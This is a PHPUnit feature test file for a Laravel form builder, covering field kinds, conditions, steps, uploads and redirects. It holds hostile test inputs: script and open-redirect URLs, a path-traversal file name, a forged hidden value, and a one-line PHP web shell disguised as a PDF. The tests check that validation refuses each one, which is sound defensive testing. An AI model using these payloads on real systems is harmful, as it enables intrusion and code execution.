<?php

namespace Tests\Feature;

use App\Enums\Role as RoleEnum;
use App\Http\Middleware\ThrottleRequestsPerRoute;
use App\Models\Form;
use App\Models\FormField;
use App\Models\FormSubmission;
use App\Models\Lead;
use App\Models\Role;
use App\Models\User;
use App\Notifications\FormSubmitted;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Notifications\AnonymousNotifiable;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Storage;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * The form builder upgrade (0.117.0, docs/forms.md): the new field kinds,
 * conditions, steps, uploads, the redirect, the export.
 *
 * The rule the whole module rests on is unchanged and is what most of this
 * pins from new directions: **the stored definition is the contract, not the
 * payload.** A hidden field's value is the definition's whatever is posted; a
 * field its condition hid is dropped whatever is posted; a file is what its
 * bytes say it is whatever it is called.
 */
class FormBuilderTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('local');
        Notification::fake();
    }

    private function staff(RoleEnum $role = RoleEnum::ContentManager): User
    {
        $user = User::firstOrCreate(
            ['email' => $role->value.'@example.test'],
            ['name' => 'Test staff', 'password' => 'password-for-tests', 'is_active' => true],
        );

        if ($user->roles()->count() === 0) {
            $user->roles()->attach(Role::firstOrCreate(['slug' => $role->value], ['name' => $role->label()]));
        }

        return $user;
    }

    /**
     * A published form built straight into the table.
     *
     * @param  list<array<string, mixed>>  $fields
     */
    private function form(array $fields, array $attributes = []): Form
    {
        $form = Form::create(['name' => 'Survey', 'slug' => 'survey', 'status' => 'published'] + $attributes);

        foreach ($fields as $i => $field) {
            FormField::create($field + [
                'form_id' => $form->id,
                'label' => ucfirst(str_replace('_', ' ', $field['name'])),
                'required' => false,
                'sort_order' => $i,
            ]);
        }

        return $form->fresh();
    }

    /** @param  list<string>  $values */
    private function choiceList(array $values): array
    {
        return array_map(fn (string $v) => ['value' => $v, 'label' => ucfirst($v)], $values);
    }

    /** A real upload whose type is read from its bytes, as a browser's would be. */
    private function upload(string $name, string $contents): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'tw-form-');
        file_put_contents($path, $contents);

        return new UploadedFile($path, $name, null, null, true);
    }

    private function pdf(string $name = 'Site plan.pdf'): UploadedFile
    {
        return $this->upload($name, "%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n");
    }

    /**
     * The same keys and the same values, strictly — in any order.
     *
     * Every one of these is read back from a MySQL JSON column, which keeps
     * an object's keys by length and then alphabetically rather than as
     * written. The order is not a fact about the form; the types are.
     */
    private function assertSameMap(array $expected, mixed $actual, string $message = ''): void
    {
        $this->assertIsArray($actual, $message);
        ksort($expected);
        ksort($actual);

        $this->assertSame($expected, $actual, $message);
    }

    private function latest(): FormSubmission
    {
        return FormSubmission::query()->latest('id')->firstOrFail();
    }

    private function save(array $fields, array $form = [])
    {
        return $this->actingAs($this->staff(), 'sanctum')
            ->postJson('/api/v1/admin/forms', ['name' => 'Built', 'fields' => $fields] + $form);
    }

    // ------------------------------------------------------------- the builder

    public function test_every_new_kind_saves_and_is_reduced_to_what_it_keeps(): void
    {
        $response = $this->save([
            ['kind' => 'heading', 'label' => 'About you', 'help' => 'Two questions.', 'required' => true],
            ['kind' => 'text', 'name' => 'name', 'label' => 'Name', 'required' => true],
            ['kind' => 'url', 'name' => 'site', 'label' => 'Website'],
            ['kind' => 'date', 'name' => 'visit_on', 'label' => 'Visit on', 'settings' => ['min' => 'today', 'max' => '2030-12-31', 'value' => 'stray']],
            ['kind' => 'number', 'name' => 'seats', 'label' => 'Seats', 'settings' => ['min' => '1', 'max' => 500]],
            ['kind' => 'step', 'label' => 'What you need'],
            ['kind' => 'radio', 'name' => 'urgency', 'label' => 'Urgency', 'options' => $this->choiceList(['now', 'later'])],
            ['kind' => 'checkboxes', 'name' => 'interests', 'label' => 'Interests', 'options' => $this->choiceList(['wifi', 'cctv', 'amc'])],
            ['kind' => 'rating', 'name' => 'score', 'label' => 'Score'],
            ['kind' => 'file', 'name' => 'plan', 'label' => 'Floor plan', 'settings' => ['accept' => ['pdf', 'image'], 'max_kb' => 2048]],
            ['kind' => 'file', 'name' => 'photo', 'label' => 'Photo'],
            ['kind' => 'hidden', 'name' => 'campaign', 'label' => 'Campaign', 'required' => true, 'settings' => ['value' => 'spring-26']],
            ['kind' => 'step'],
            ['kind' => 'text', 'name' => 'note', 'label' => 'Note', 'options' => $this->choiceList(['x', 'y']), 'settings' => ['min' => 3]],
        ], ['redirect_url' => '/thank-you'])->assertCreated();

        $fields = collect($response->json('data.fields'))->keyBy('name');

        // A heading and a step break are named by the server and are never
        // required, whatever was sent.
        $this->assertSame('heading', $fields['section_1']['kind']);
        $this->assertFalse($fields['section_1']['required']);
        $this->assertSame('What you need', $fields['step_1']['label']);
        $this->assertSame('Step 3', $fields['step_2']['label'], 'a step break left blank is titled by its number');

        // Each kind keeps its own settings and nothing else.
        $this->assertSameMap(['min' => 'today', 'max' => '2030-12-31'], $fields['visit_on']['settings']);
        $this->assertSameMap(['min' => 1, 'max' => 500], $fields['seats']['settings']);
        $this->assertSameMap(['accept' => ['image', 'pdf'], 'max_kb' => 2048], $fields['plan']['settings']);
        $this->assertSameMap(['accept' => ['image', 'pdf'], 'max_kb' => 5120], $fields['photo']['settings'], 'the defaults');
        $this->assertSame(['value' => 'spring-26'], $fields['campaign']['settings'], 'the console reads a hidden value; a page never does');
        $this->assertFalse($fields['campaign']['required'], 'a hidden value cannot be required of anybody');
        $this->assertNull($fields['note']['settings']);
        $this->assertSame([], $fields['note']['options'], 'options are kept only where there is a list to choose from');

        $response->assertJsonPath('data.redirect_url', '/thank-you')
            ->assertJsonPath('data.has_files', true)
            ->assertJsonPath('data.steps', 3);
    }

    /** The console draws its palette from the API's list, never from one of its own. */
    public function test_the_builder_vocabulary_rides_on_meta(): void
    {
        $form = $this->form([['kind' => 'text', 'name' => 'name']]);

        foreach (['/api/v1/admin/forms', "/api/v1/admin/forms/{$form->id}"] as $url) {
            $meta = $this->actingAs($this->staff(), 'sanctum')->getJson($url)->assertOk()->json('meta');

            $this->assertSame(FormField::KINDS, array_column($meta['kinds'], 'value'));
            $kinds = collect($meta['kinds'])->keyBy('value');
            $this->assertTrue($kinds['radio']['takes_options']);
            $this->assertTrue($kinds['step']['is_layout']);
            $this->assertTrue($kinds['file']['is_file']);
            $this->assertFalse($kinds['text']['is_layout']);
            $this->assertNotSame('', $kinds['hidden']['blurb']);
            $this->assertSame(['equals', 'not_equals', 'includes', 'filled', 'empty'], array_column($meta['ops'], 'value'));
            $this->assertSame(['image', 'pdf', 'document'], array_column($meta['file_accepts'], 'value'));
            $this->assertContains('docx', $meta['file_accepts'][2]['extensions']);
            $this->assertGreaterThan(0, $meta['max_upload_kb']);
            $this->assertLessThanOrEqual(20480, $meta['max_upload_kb']);
        }

        // The index keeps its pagination beside it.
        $this->getJson('/api/v1/admin/forms')->assertJsonPath('meta.total', 1);
    }

    public function test_a_list_needs_something_to_choose_from_and_keys_are_unique(): void
    {
        $this->save([
            ['kind' => 'radio', 'name' => 'one', 'label' => 'One', 'options' => $this->choiceList(['only'])],
            ['kind' => 'checkboxes', 'name' => 'two', 'label' => 'Two'],
            ['kind' => 'select', 'name' => 'three', 'label' => 'Three', 'options' => []],
            ['kind' => 'radio', 'name' => 'four', 'label' => 'Four', 'options' => $this->choiceList(['same', 'same'])],
            ['kind' => 'text', 'name' => 'one', 'label' => 'Again'],
            ['kind' => 'text', 'label' => 'No key'],
            ['kind' => 'heading'],
        ])->assertStatus(422)->assertJsonValidationErrors([
            'fields.0.options', 'fields.1.options', 'fields.2.options', 'fields.3.options',
            'fields.4.name', 'fields.5.name', 'fields.6.label',
        ]);
    }

    public function test_settings_of_the_wrong_shape_are_refused_by_name(): void
    {
        $this->save([
            ['kind' => 'date', 'name' => 'a', 'label' => 'A', 'settings' => ['min' => 'tomorrow']],
            ['kind' => 'date', 'name' => 'b', 'label' => 'B', 'settings' => ['min' => '2026-12-01', 'max' => '2026-01-01']],
            ['kind' => 'number', 'name' => 'c', 'label' => 'C', 'settings' => ['min' => 'few']],
            ['kind' => 'file', 'name' => 'd', 'label' => 'D', 'settings' => ['accept' => ['zip']]],
            ['kind' => 'file', 'name' => 'e', 'label' => 'E', 'settings' => ['max_kb' => 50]],
            ['kind' => 'file', 'name' => 'f', 'label' => 'F', 'settings' => ['max_kb' => 999999, 'accept' => []]],
            ['kind' => 'hidden', 'name' => 'g', 'label' => 'G', 'settings' => ['value' => str_repeat('x', 256)]],
        ])->assertStatus(422)->assertJsonValidationErrors([
            'fields.0.settings.min', 'fields.1.settings.max', 'fields.2.settings.min',
            'fields.3.settings.accept', 'fields.4.settings.max_kb',
            'fields.5.settings.max_kb', 'fields.5.settings.accept', 'fields.6.settings.value',
        ]);
    }

    public function test_a_form_holds_at_most_three_file_fields(): void
    {
        $file = fn (string $name) => ['kind' => 'file', 'name' => $name, 'label' => $name];

        $this->save([$file('a'), $file('b'), $file('c')])->assertCreated();

        $this->save([$file('a'), $file('b'), $file('c'), $file('d')])
            ->assertStatus(422)
            ->assertJsonValidationErrors(['fields.3.kind'])
            ->assertJsonMissingValidationErrors(['fields.2.kind']);
    }

    /**
     * A condition that could never be evaluated is refused when it is saved.
     *
     * Each of these saves happily without the check and then fails in front
     * of a visitor instead, as a field that never appears.
     */
    public function test_a_condition_must_read_an_earlier_field_that_has_an_answer(): void
    {
        $this->save([
            ['kind' => 'heading', 'name' => 'intro', 'label' => 'Intro'],
            ['kind' => 'file', 'name' => 'plan', 'label' => 'Plan'],
            ['kind' => 'hidden', 'name' => 'campaign', 'label' => 'Campaign', 'settings' => ['value' => 'x']],
            ['kind' => 'text', 'name' => 'a', 'label' => 'A', 'show_if' => ['field' => 'nobody', 'op' => 'filled']],
            ['kind' => 'text', 'name' => 'b', 'label' => 'B', 'show_if' => ['field' => 'later', 'op' => 'filled']],
            ['kind' => 'text', 'name' => 'c', 'label' => 'C', 'show_if' => ['field' => 'c', 'op' => 'filled']],
            ['kind' => 'text', 'name' => 'd', 'label' => 'D', 'show_if' => ['field' => 'plan', 'op' => 'filled']],
            ['kind' => 'text', 'name' => 'e', 'label' => 'E', 'show_if' => ['field' => 'campaign', 'op' => 'equals', 'value' => 'x']],
            ['kind' => 'text', 'name' => 'f', 'label' => 'F', 'show_if' => ['field' => 'intro', 'op' => 'filled']],
            ['kind' => 'text', 'name' => 'g', 'label' => 'G', 'show_if' => ['field' => 'a', 'op' => 'equals']],
            ['kind' => 'text', 'name' => 'h', 'label' => 'H', 'show_if' => ['field' => 'a', 'op' => 'matches', 'value' => 'x']],
            ['kind' => 'text', 'name' => 'i', 'label' => 'I', 'show_if' => ['field' => 'a', 'op' => 'includes', 'value' => 'x']],
            ['kind' => 'text', 'name' => 'j', 'label' => 'J', 'show_if' => ['field' => 'a', 'op' => 'equals', 'value' => str_repeat('x', 151)]],
            ['kind' => 'text', 'name' => 'later', 'label' => 'Later'],
        ])->assertStatus(422)->assertJsonValidationErrors([
            'fields.3.show_if.field' => 'No field on this form',
            'fields.4.show_if.field' => 'comes before',
            'fields.5.show_if.field' => 'its own answer',
            'fields.6.show_if.field' => 'file upload',
            'fields.7.show_if.field' => 'file upload',
            'fields.8.show_if.field' => 'file upload',
            'fields.9.show_if.value',
            'fields.10.show_if.op',
            'fields.11.show_if.op' => 'multiple-choice',
            'fields.12.show_if.value',
        ]);
    }

    public function test_a_sound_condition_is_stored_and_an_empty_one_means_none(): void
    {
        $response = $this->save([
            ['kind' => 'checkboxes', 'name' => 'interests', 'label' => 'Interests', 'options' => $this->choiceList(['wifi', 'cctv'])],
            ['kind' => 'checkbox', 'name' => 'callback', 'label' => 'Call me'],
            ['kind' => 'text', 'name' => 'a', 'label' => 'A', 'show_if' => ['field' => 'interests', 'op' => 'includes', 'value' => 'cctv', 'junk' => 1]],
            ['kind' => 'tel', 'name' => 'b', 'label' => 'B', 'show_if' => ['field' => 'callback', 'op' => 'filled', 'value' => 'ignored']],
            ['kind' => 'text', 'name' => 'c', 'label' => 'C', 'show_if' => ['field' => null, 'op' => null]],
            ['kind' => 'text', 'name' => 'd', 'label' => 'D', 'show_if' => []],
        ])->assertCreated();

        $fields = collect($response->json('data.fields'))->keyBy('name');

        $this->assertSameMap(['field' => 'interests', 'op' => 'includes', 'value' => 'cctv'], $fields['a']['show_if']);
        $this->assertSameMap(['field' => 'callback', 'op' => 'filled'], $fields['b']['show_if']);
        $this->assertNull($fields['c']['show_if']);
        $this->assertNull($fields['d']['show_if']);
    }

    /**
     * It becomes a navigation on a public page, for everybody who fills the
     * form in.
     */
    public function test_the_redirect_is_a_path_or_an_http_url_and_nothing_else(): void
    {
        $fields = [['kind' => 'text', 'name' => 'name', 'label' => 'Name']];

        foreach (['/thank-you', '/thanks?from=survey#top', 'https://calendar.example/book'] as $ok) {
            $this->save($fields, ['redirect_url' => $ok])->assertCreated()->assertJsonPath('data.redirect_url', $ok);
        }

        foreach (['javascript:alert(1)', '//evil.example', '/\\evil.example', 'mailto:a@b.test', 'tel:123', 'thank-you', 'data:text/html,x'] as $unsafe) {
            $this->save($fields, ['redirect_url' => $unsafe])
                ->assertStatus(422)
                ->assertJsonValidationErrors(['redirect_url']);
        }

        $form = Form::query()->latest('id')->first();

        $this->actingAs($this->staff(), 'sanctum')
            ->patchJson("/api/v1/admin/forms/{$form->id}", ['redirect_url' => null])
            ->assertOk()
            ->assertJsonPath('data.redirect_url', null);
    }

    // ------------------------------------------------------- the public read

    public function test_the_public_read_carries_what_the_page_needs_and_not_the_hidden_value(): void
    {
        $this->form([
            ['kind' => 'heading', 'name' => 'section_1', 'help' => 'A paragraph.'],
            ['kind' => 'radio', 'name' => 'urgency', 'options' => $this->choiceList(['now', 'later'])],
            ['kind' => 'date', 'name' => 'visit_on', 'settings' => ['min' => 'today'], 'show_if' => ['field' => 'urgency', 'op' => 'equals', 'value' => 'now']],
            ['kind' => 'step', 'name' => 'step_1'],
            ['kind' => 'file', 'name' => 'plan', 'settings' => ['accept' => ['pdf'], 'max_kb' => 300]],
            ['kind' => 'hidden', 'name' => 'campaign', 'settings' => ['value' => 'spring-26']],
        ], ['redirect_url' => '/thank-you', 'notify_email' => 'desk@example.test']);

        $response = $this->getJson('/api/v1/forms/survey')->assertOk()
            ->assertJsonPath('data.redirect_url', '/thank-you')
            ->assertJsonPath('data.has_files', true)
            ->assertJsonPath('data.steps', 2)
            ->assertJsonMissingPath('data.notify_email');

        $fields = collect($response->json('data.fields'))->keyBy('name');

        $this->assertSame('hidden', $fields['campaign']['kind']);
        $this->assertNull($fields['campaign']['settings'], 'the server fills it; the page is never told what with');
        $this->assertStringNotContainsString('spring-26', $response->getContent());

        $this->assertSame(['min' => 'today'], $fields['visit_on']['settings']);
        $this->assertSameMap(['field' => 'urgency', 'op' => 'equals', 'value' => 'now'], $fields['visit_on']['show_if']);
        $this->assertNull($fields['urgency']['show_if']);
        // The limit in force and the extensions spelled out, so the page can
        // refuse a file before sending it without an allowlist of its own.
        $this->assertSame(['accept' => ['pdf'], 'extensions' => ['pdf'], 'max_kb' => 300], $fields['plan']['settings']);
        $this->assertSame('A paragraph.', $fields['section_1']['help']);
    }

    public function test_a_form_of_nothing_but_headings_is_fieldless(): void
    {
        $this->form([['kind' => 'heading', 'name' => 'section_1'], ['kind' => 'step', 'name' => 'step_1']]);

        $this->getJson('/api/v1/forms/survey')->assertNotFound();
        $this->postJson('/api/v1/forms/survey', [])->assertNotFound();
    }

    // ------------------------------------------------------------ submitting

    public function test_each_new_kind_validates_and_is_stored_in_its_own_shape(): void
    {
        $this->form([
            ['kind' => 'heading', 'name' => 'section_1'],
            ['kind' => 'url', 'name' => 'site', 'required' => true],
            ['kind' => 'date', 'name' => 'visit_on', 'settings' => ['min' => 'today']],
            ['kind' => 'step', 'name' => 'step_1'],
            ['kind' => 'radio', 'name' => 'urgency', 'options' => $this->choiceList(['now', 'later'])],
            ['kind' => 'checkboxes', 'name' => 'interests', 'required' => true, 'options' => $this->choiceList(['wifi', 'cctv', 'amc'])],
            ['kind' => 'rating', 'name' => 'score'],
            ['kind' => 'number', 'name' => 'seats', 'settings' => ['min' => 1, 'max' => 500]],
            ['kind' => 'checkbox', 'name' => 'agree', 'required' => true],
            ['kind' => 'hidden', 'name' => 'campaign', 'settings' => ['value' => 'spring-26']],
        ], ['redirect_url' => '/thank-you']);

        $answers = [
            'site' => 'https://acme.example/about',
            'visit_on' => now()->addDays(3)->toDateString(),
            'urgency' => 'later',
            'interests' => ['cctv', 'wifi'],
            'score' => '4',
            'seats' => '120',
            'agree' => true,
            // Posted, and ignored: the value is the definition's.
            'campaign' => 'attacker-chose-this',
            // A layout row's key is not an answer, and neither is a stranger's.
            'section_1' => 'x', 'step_1' => 'y', 'role' => 'admin',
        ];

        $this->postJson('/api/v1/forms/survey', $answers)
            ->assertCreated()
            ->assertJsonPath('redirect_url', '/thank-you');

        $this->assertSameMap([
            'site' => 'https://acme.example/about',
            'visit_on' => now()->addDays(3)->toDateString(),
            'urgency' => 'later',
            'interests' => ['cctv', 'wifi'],
            'score' => 4,
            'seats' => 120,
            'agree' => true,
            'campaign' => 'spring-26',
        ], FormSubmission::sole()->data);

        $refused = [
            'site' => ['javascript:alert(1)', 'ftp://acme.example', 'acme.example'],
            'visit_on' => [now()->subDay()->toDateString(), '31/12/2030', 'soon'],
            'urgency' => ['never'],
            'interests' => [[], ['wifi', 'nonsense'], 'nonsense', ['wifi', 'wifi']],
            'score' => [0, 6, '4.5', 'five'],
            'seats' => [0, 501, 'many'],
            'agree' => [false, '0'],
        ];

        // Twenty-one submissions in one test is past the route's ten a
        // minute, which is the throttle doing its job and not what this is
        // about.
        $this->withoutMiddleware(ThrottleRequestsPerRoute::class);

        foreach ($refused as $field => $values) {
            foreach ($values as $value) {
                $this->postJson('/api/v1/forms/survey', [$field => $value] + $answers)
                    ->assertStatus(422)
                    ->assertJsonValidationErrors([$field]);
            }
        }

        $this->assertSame(1, FormSubmission::count());
    }

    /**
     * A form with a file field is posted as `multipart/form-data`, where a
     * ticked box is the word `on` and one ticked option of a group is a bare
     * string. Both are the answers JSON would have sent as `true` and a list.
     */
    public function test_a_multipart_body_is_read_like_a_json_one(): void
    {
        $this->form([
            ['kind' => 'checkboxes', 'name' => 'interests', 'options' => $this->choiceList(['wifi', 'cctv'])],
            ['kind' => 'checkboxes', 'name' => 'days', 'options' => $this->choiceList(['mon', 'tue'])],
            ['kind' => 'checkbox', 'name' => 'agree', 'required' => true],
            ['kind' => 'rating', 'name' => 'score'],
            ['kind' => 'text', 'name' => 'note'],
        ]);

        $this->post('/api/v1/forms/survey', [
            'interests' => ['wifi', 'cctv'],
            'days' => 'tue',
            'agree' => 'on',
            'score' => '5',
            'note' => '',
        ], ['Accept' => 'application/json'])->assertCreated();

        $this->assertSameMap(
            ['interests' => ['wifi', 'cctv'], 'days' => ['tue'], 'agree' => true, 'score' => 5, 'note' => null],
            FormSubmission::sole()->data,
        );
    }

    // ------------------------------------------------------------ conditions

    /**
     * Hiding a field in the browser is presentation. This is the decision.
     *
     * A required field nobody was shown must not refuse the submission, and a
     * value posted for it — typed before it was hidden again, or sent by
     * something that never rendered the form — must not be stored as the
     * answer to a question that was never asked.
     */
    public function test_a_field_its_condition_hides_is_not_required_and_its_value_is_dropped(): void
    {
        $this->form([
            ['kind' => 'radio', 'name' => 'contact_by', 'required' => true, 'options' => $this->choiceList(['email', 'phone'])],
            ['kind' => 'tel', 'name' => 'phone', 'required' => true, 'show_if' => ['field' => 'contact_by', 'op' => 'equals', 'value' => 'phone']],
        ]);

        // Hidden: not required, and what was posted for it is gone.
        $this->postJson('/api/v1/forms/survey', ['contact_by' => 'email', 'phone' => '+91 98300 11223'])->assertCreated();
        $this->assertSameMap(['contact_by' => 'email'], $this->latest()->data);

        // Shown: required again, and validated as what it is.
        $this->postJson('/api/v1/forms/survey', ['contact_by' => 'phone'])
            ->assertStatus(422)->assertJsonValidationErrors(['phone']);
        $this->postJson('/api/v1/forms/survey', ['contact_by' => 'phone', 'phone' => 'x'])
            ->assertStatus(422)->assertJsonValidationErrors(['phone']);

        $this->postJson('/api/v1/forms/survey', ['contact_by' => 'phone', 'phone' => '+91 98300 11223'])->assertCreated();
        $this->assertSameMap(['contact_by' => 'phone', 'phone' => '+91 98300 11223'], $this->latest()->data);
    }

    /**
     * A field whose source is itself hidden is hidden, whatever its own
     * operator says — `empty` included, which would otherwise be *true* of an
     * answer that was dropped.
     */
    public function test_a_chain_of_conditions_hides_everything_below_the_break(): void
    {
        $this->form([
            ['kind' => 'checkbox', 'name' => 'has_site'],
            ['kind' => 'text', 'name' => 'city', 'required' => true, 'show_if' => ['field' => 'has_site', 'op' => 'filled']],
            ['kind' => 'text', 'name' => 'area', 'required' => true, 'show_if' => ['field' => 'city', 'op' => 'equals', 'value' => 'Kolkata']],
            ['kind' => 'text', 'name' => 'why_not', 'required' => true, 'show_if' => ['field' => 'city', 'op' => 'empty']],
            ['kind' => 'hidden', 'name' => 'branch', 'settings' => ['value' => 'east'], 'show_if' => ['field' => 'city', 'op' => 'equals', 'value' => 'Kolkata']],
        ]);

        // The first link fails: everything below it is skipped, values and all.
        $this->postJson('/api/v1/forms/survey', [
            'has_site' => false, 'city' => 'Kolkata', 'area' => 'Salt Lake', 'why_not' => 'x',
        ])->assertCreated();
        $this->assertSameMap(['has_site' => false], $this->latest()->data);

        // The first holds and the second does not: `area` and `branch` go, and
        // `why_not` is not shown either, because the city *was* answered.
        $this->postJson('/api/v1/forms/survey', ['has_site' => true, 'city' => 'Howrah', 'area' => 'Shibpur'])->assertCreated();
        $this->assertSameMap(['has_site' => true, 'city' => 'Howrah'], $this->latest()->data);

        // Every link holds, so the last one is required after all.
        $this->postJson('/api/v1/forms/survey', ['has_site' => true, 'city' => 'Kolkata'])
            ->assertStatus(422)->assertJsonValidationErrors(['area'])->assertJsonMissingValidationErrors(['why_not']);

        $this->postJson('/api/v1/forms/survey', ['has_site' => 'on', 'city' => 'Kolkata', 'area' => 'Salt Lake'])->assertCreated();
        $this->assertSameMap(
            ['has_site' => true, 'city' => 'Kolkata', 'area' => 'Salt Lake', 'branch' => 'east'],
            $this->latest()->data,
        );
    }

    /**
     * @return array<string, array{0: array<string, mixed>, 1: array<string, mixed>, 2: array<string, mixed>, 3: bool}>
     */
    public static function conditions(): array
    {
        $text = ['kind' => 'text', 'name' => 'source'];
        $boxes = ['kind' => 'checkboxes', 'name' => 'source', 'options' => [['value' => 'wifi', 'label' => 'Wi-Fi'], ['value' => 'cctv', 'label' => 'CCTV']]];
        $tick = ['kind' => 'checkbox', 'name' => 'source'];
        $rating = ['kind' => 'rating', 'name' => 'source'];

        return [
            'equals, matching' => [$text, ['op' => 'equals', 'value' => 'yes'], ['source' => 'yes'], true],
            'equals, different' => [$text, ['op' => 'equals', 'value' => 'yes'], ['source' => 'no'], false],
            'equals is exact about case' => [$text, ['op' => 'equals', 'value' => 'yes'], ['source' => 'Yes'], false],
            'equals, unanswered' => [$text, ['op' => 'equals', 'value' => 'yes'], [], false],
            'equals compares numbers as numbers' => [$rating, ['op' => 'equals', 'value' => '4'], ['source' => 4], true],
            'equals on a ticked box' => [$tick, ['op' => 'equals', 'value' => '1'], ['source' => true], true],
            'equals on an unticked box' => [$tick, ['op' => 'equals', 'value' => '1'], ['source' => false], false],
            'not_equals, different' => [$text, ['op' => 'not_equals', 'value' => 'yes'], ['source' => 'no'], true],
            'not_equals, matching' => [$text, ['op' => 'not_equals', 'value' => 'yes'], ['source' => 'yes'], false],
            'not_equals, unanswered' => [$text, ['op' => 'not_equals', 'value' => 'yes'], [], true],
            'includes, ticked' => [$boxes, ['op' => 'includes', 'value' => 'cctv'], ['source' => ['wifi', 'cctv']], true],
            'includes, not ticked' => [$boxes, ['op' => 'includes', 'value' => 'cctv'], ['source' => ['wifi']], false],
            'includes, nothing ticked' => [$boxes, ['op' => 'includes', 'value' => 'cctv'], [], false],
            'not_equals on a list means does not include' => [$boxes, ['op' => 'not_equals', 'value' => 'cctv'], ['source' => ['wifi']], true],
            'filled, answered' => [$text, ['op' => 'filled'], ['source' => 'anything'], true],
            'filled, blank' => [$text, ['op' => 'filled'], ['source' => '  '], false],
            'filled, a ticked box' => [$tick, ['op' => 'filled'], ['source' => 'on'], true],
            'filled, an unticked box' => [$tick, ['op' => 'filled'], ['source' => false], false],
            'filled, a list with something in it' => [$boxes, ['op' => 'filled'], ['source' => ['wifi']], true],
            'empty, unanswered' => [$text, ['op' => 'empty'], [], true],
            'empty, answered' => [$text, ['op' => 'empty'], ['source' => 'x'], false],
            'empty, a list with nothing in it' => [$boxes, ['op' => 'empty'], ['source' => []], true],
        ];
    }

    /**
     * The five operators. `target` is required, so a submission without it is
     * a 422 exactly when the condition shows it.
     */
    #[DataProvider('conditions')]
    public function test_the_five_operators(array $source, array $condition, array $payload, bool $shown): void
    {
        $this->form([
            $source,
            ['kind' => 'text', 'name' => 'target', 'required' => true, 'show_if' => ['field' => 'source'] + $condition],
        ]);

        $response = $this->postJson('/api/v1/forms/survey', $payload + ['target' => null]);

        $shown
            ? $response->assertStatus(422)->assertJsonValidationErrors(['target'])
            : $response->assertCreated();

        if ($shown) {
            $this->postJson('/api/v1/forms/survey', $payload + ['target' => 'answered'])->assertCreated();
            $this->assertSame('answered', FormSubmission::sole()->data['target']);
        } else {
            $this->postJson('/api/v1/forms/survey', $payload + ['target' => 'answered'])->assertCreated();
            $this->assertArrayNotHasKey('target', $this->latest()->data);
        }
    }

    // --------------------------------------------------------------- uploads

    private function uploadForm(array $settings = ['accept' => ['pdf'], 'max_kb' => 300], bool $required = true): Form
    {
        return $this->form([
            ['kind' => 'text', 'name' => 'name', 'required' => true],
            ['kind' => 'file', 'name' => 'plan', 'label' => 'Floor plan', 'required' => $required, 'settings' => $settings],
        ]);
    }

    private function send(array $payload)
    {
        return $this->post('/api/v1/forms/survey', $payload, ['Accept' => 'application/json']);
    }

    public function test_an_upload_is_stored_privately_under_a_hashed_name(): void
    {
        $form = $this->uploadForm();

        $this->send(['name' => 'Priya Das', 'plan' => $this->pdf('../../Site plan "final".pdf')])->assertCreated();

        $submission = FormSubmission::sole();
        $file = $submission->files['plan'];

        // What the visitor called it is a label, cleaned, and is the answer
        // an email or an export can show.
        $this->assertSame('Site plan final.pdf', $file['name']);
        $this->assertSameMap(['name' => 'Priya Das', 'plan' => 'Site plan final.pdf'], $submission->data);

        // Where it is kept owes nothing to that name.
        $this->assertMatchesRegularExpression("#^form-uploads/{$form->id}/[A-Za-z0-9]{40}\\.pdf$#", $file['path']);
        Storage::disk('local')->assertExists($file['path']);
        $this->assertSame('application/pdf', $file['mime'], 'the type the bytes sniff as');
        $this->assertGreaterThan(0, $file['size']);

        // It files a lead like any other submission.
        $this->assertSame('form_submission', Lead::sole()->source_type);
    }

    public function test_an_optional_upload_may_be_left_out(): void
    {
        $this->uploadForm(required: false);

        $this->send(['name' => 'Priya Das'])->assertCreated();

        $submission = FormSubmission::sole();
        $this->assertNull($submission->files);
        $this->assertSame(['name' => 'Priya Das'], $submission->data);
        $this->assertSame([], Storage::disk('local')->allFiles());
    }

    public function test_an_upload_is_held_to_its_extension_its_content_and_its_size(): void
    {
        $this->uploadForm();

        // Required, and a string is not a file.
        $this->send(['name' => 'x'])->assertStatus(422)->assertJsonValidationErrors(['plan']);
        $this->postJson('/api/v1/forms/survey', ['name' => 'x', 'plan' => 'plan.pdf'])
            ->assertStatus(422)->assertJsonValidationErrors(['plan']);

        // By extension: a real image, to a field that takes PDFs.
        $this->send(['name' => 'x', 'plan' => UploadedFile::fake()->image('photo.png', 40, 40)])
            ->assertStatus(422)->assertJsonValidationErrors(['plan']);

        // By content: a script that calls itself a PDF. `extensions:` passes
        // it and `mimes:` does not, which is why both are there.
        $this->send(['name' => 'x', 'plan' => $this->upload('brief.pdf', "<?php\nsystem(\$_GET['c']);\n")])
            ->assertStatus(422)->assertJsonValidationErrors(['plan']);

        // And the other way round: a real PDF arriving under a script's name.
        $this->send(['name' => 'x', 'plan' => $this->pdf('brief.php')])
            ->assertStatus(422)->assertJsonValidationErrors(['plan']);

        // By size: the field's own limit, 300 KB.
        $this->send(['name' => 'x', 'plan' => UploadedFile::fake()->create('big.pdf', 301, 'application/pdf')])
            ->assertStatus(422)->assertJsonValidationErrors(['plan']);

        // Two files for one field.
        $this->send(['name' => 'x', 'plan' => [$this->pdf('a.pdf'), $this->pdf('b.pdf')]])
            ->assertStatus(422)->assertJsonValidationErrors(['plan']);

        // Nothing was written for any of them.
        $this->assertSame(0, FormSubmission::count());
        $this->assertSame([], Storage::disk('local')->allFiles());

        $this->send(['name' => 'x', 'plan' => UploadedFile::fake()->create('fits.pdf', 300, 'application/pdf')])->assertCreated();
    }

    public function test_a_refused_submission_stores_no_file_even_when_the_file_was_fine(): void
    {
        $this->uploadForm();

        $this->send(['plan' => $this->pdf()])->assertStatus(422)->assertJsonValidationErrors(['name']);

        $this->assertSame([], Storage::disk('local')->allFiles());
    }

    public function test_an_upload_hidden_by_its_condition_is_not_stored(): void
    {
        $this->form([
            ['kind' => 'checkbox', 'name' => 'has_plan'],
            ['kind' => 'file', 'name' => 'plan', 'required' => true, 'show_if' => ['field' => 'has_plan', 'op' => 'filled']],
        ]);

        $this->send(['has_plan' => '0', 'plan' => $this->pdf()])->assertCreated();

        $this->assertNull(FormSubmission::sole()->files);
        $this->assertSame([], Storage::disk('local')->allFiles());
    }

    // ------------------------------------------------------------ the console

